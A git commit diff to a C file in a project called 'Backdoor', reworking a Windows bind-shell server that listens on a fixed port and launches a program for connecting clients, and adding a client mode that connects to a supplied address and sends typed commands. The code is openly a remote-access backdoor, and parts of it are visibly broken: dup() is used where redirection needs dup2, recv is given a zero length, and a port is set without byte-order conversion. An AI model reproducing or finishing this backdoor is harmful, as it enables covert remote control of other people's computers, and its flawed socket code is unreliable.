8f69717ed6e05697c26bd52638108330284507a7
Philip R. Simonson <drunkenmaster1988@gmail.com>
2017-05-04 18:46:22 -0400

    Changed the Backdoor a little.

--- cblocks_projects/Backdoor/main.c
+++ cblocks_projects/Backdoor/main.c
@@ -42,60 +42,96 @@ size_t s;
 		*(p+i)=0;
 }
 
+#define MAXBUF 1024
+
 int
-main()
+main(argc, argv)
+int argc;
+char **argv;
 {
 	WSADATA wsaData;
 	int sockfd;
 	struct sockaddr_in self;
 
-	WSAStartup(MAKEWORD(2, 0), &wsaData);
 	sockfd = 0;
-    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
+	WSAStartup(MAKEWORD(2, 0), &wsaData);
 
-	/* Setup socket address struct */
-	pzero(&self, sizeof(self));
-	self.sin_family = AF_INET;
-	self.sin_port = htons(MY_PORT);
-	self.sin_addr.s_addr = INADDR_ANY;
+	if(argc < 2) {
+	    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
 
-	/* bind port to socket */
-	TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
-	/* listen for connections */
-	TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));
+		/* Setup socket address struct */
+		pzero(&self, sizeof(self));
+		self.sin_family = AF_INET;
+		self.sin_port = htons(MY_PORT);
+		self.sin_addr.s_addr = INADDR_ANY;
 
-	for(;;) {
-		int clientfd;
-		struct sockaddr_in client;
-		int clientlen = sizeof(client);
-		char message[256];
+		/* bind port to socket */
+		TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
+		/* listen for connections */
+		TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));
 
-		/* accept connection */
-		clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
-		if(clientfd>0) {
-			pzero(message, sizeof(message));
-			sprintf(message, "%s:%u client connected.", inet_ntoa(client.sin_addr),
-				client.sin_port);
-			puts(message);
-			dup(0);
-			dup(1);
-			dup(2);
-			execlpe(PROGRAM_NAME, NULL, NULL);
-			if(closesocket(clientfd)==0) {
+		for(;;) {
+			int clientfd;
+			struct sockaddr_in client;
+			int clientlen = sizeof(client);
+			char message[256];
+
+			/* accept connection */
+			clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
+			if(clientfd>0) {
 				pzero(message, sizeof(message));
-				sprintf(message, "%s:%u client disconnected.", inet_ntoa(client.sin_addr),
+				sprintf(message, "%s:%u client connected.", inet_ntoa(client.sin_addr),
 					client.sin_port);
 				puts(message);
-				close(0);
-				close(1);
-				close(2);
+				dup(0);
+				dup(1);
+				dup(2);
+				execlpe(PROGRAM_NAME, NULL, NULL);
+				if(closesocket(clientfd)==0) {
+					pzero(message, sizeof(message));
+					sprintf(message, "%s:%u client disconnected.", inet_ntoa(client.sin_addr),
+						client.sin_port);
+					puts(message);
+					close(0);
+					close(1);
+					close(2);
+				}
 			}
 		}
+
+		closesocket(sockfd);
+	} else if(argc == 2) {
+		char buf[MAXBUF];
+		int bytes;
+		TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
+
+		pzero(buf, sizeof(buf)/sizeof(char));
+		pzero(&self, sizeof(self));
+		self.sin_family = AF_INET;
+		self.sin_port = MY_PORT;
+		self.sin_addr.s_addr = inet_addr(argv[1]);
+
+        TERMINATE(0, connect(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
+
+        while(1) {
+        	char reply[2000];
+        	bytes=0;
+        	pzero(reply, sizeof(reply)/sizeof(char));
+        	if((bytes=recv(sockfd, reply, bytes, 0)) < 0) {
+        		puts("Error: couldn't receive data.");
+			}
+			scanf("%[^\n]", buf);
+			if((bytes=send(sockfd, buf, MAXBUF, 0)) < 0)
+				puts("Error: sending data.");
+        	pzero(buf, sizeof(buf)/sizeof(char));
+        }
+        closesocket(sockfd);
+	} else {
+		fprintf(stderr, "Usage: Backdoor.exe [Address]\n");
 	}
 
-	closesocket(sockfd);
 	WSACleanup();
-    return 0;
+	return 0;
 
 error:
 	if(sockfd != 0) closesocket(sockfd);
